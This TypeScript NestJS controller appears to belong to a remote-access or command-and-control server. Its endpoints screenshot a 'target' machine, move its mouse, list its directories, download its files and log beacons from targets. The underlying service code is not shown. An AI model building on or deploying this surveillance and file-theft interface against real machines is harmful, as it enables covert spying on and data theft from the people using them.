import {
  Controller,
  Get,
  Post,
  Body,
  Patch,
  Param,
  Delete,
  Query,
} from '@nestjs/common';
import { TargetService } from './target.service';
import { CreateTargetDto } from './dto/create-target.dto';
import { ApiTags, ApiResponse, ApiBody, ApiQuery } from '@nestjs/swagger/dist';

@ApiTags('target')
@Controller('target')
export class TargetController {
  constructor(private readonly targetService: TargetService) {}

  @ApiResponse({
    status: 201,
    description: 'The target has been successfully added to db.',
  })
  @ApiBody({
    description: 'Information of the target.',
    type: CreateTargetDto,
  })
  @Post()
  async create(@Body() createTargetDto: CreateTargetDto) {
    return await this.targetService.create(createTargetDto);
  }

  @ApiResponse({
    status: 200,
    description: 'Got the list of targets successfully.',
  })
  @Get()
  async findAll() {
    return await this.targetService.findAll();
  }

  @ApiResponse({
    status: 200,
    description: 'The Screenshot of the target display saved successfully.',
  })
  @Get('/screenshot/:targetId')
  async screenshot(@Param('targetId') targetId: string) {
    const target = await this.targetService.findTargetById(targetId);
    return await this.targetService.takeScreenshot(target);
  }

  @ApiResponse({
    status: 200,
    description: 'The mouse of the target moved successfully.',
  })
  @Get('/move-mouse/:targetId')
  @ApiQuery({
    name: 'x',
    description: 'Parameter x (coordinate)',
    required: true,
  })
  @ApiQuery({
    name: 'y',
    description: 'Parameter y (coordinate)',
    required: true,
  })
  async moveMouse(
    @Param('targetId') targetId: string,
    @Query('x') x: string,
    @Query('y') y: string,
  ) {
    const target = await this.targetService.findTargetById(targetId);
    return await this.targetService.moveMouse(target, x, y);
  }

  @ApiResponse({
    status: 200,
    description: 'Command executed successfully.',
  })
  @ApiQuery({
    name: 'path',
    description: 'The specific path for getting the ls of it.',
    required: true,
  })
  @Get('/ls/:targetId')
  async getListOfDirectory(
    @Param('targetId') targetId: string,
    @Query('path') path: string,
  ) {
    const target = await this.targetService.findTargetById(targetId);
    return await this.targetService.getListOfDirectory(target, path);
  }

  @ApiResponse({
    status: 200,
    description:
      'The files of the target with the given path saved successfully.',
  })
  @ApiQuery({
    name: 'path',
    description: 'The specific path for downloading the files of it.',
    required: true,
  })
  @Get('/download-files/:targetId')
  async downloadFiles(
    @Param('targetId') targetId: string,
    @Query('path') path: string,
  ) {
    const target = await this.targetService.findTargetById(targetId);
    return await this.targetService.downloadFiles(target, path);
  }

  @ApiBody({
    description: 'Information of the target.',
  })
  @Post('/fetch-signal')
  async fetchSignal(
    @Body() status: { host: string; port: string; status: string },
  ) {
    console.log(
      `[I] Target ${status.host}:${status.port} is ${status.status}.`,
    );
  }
}
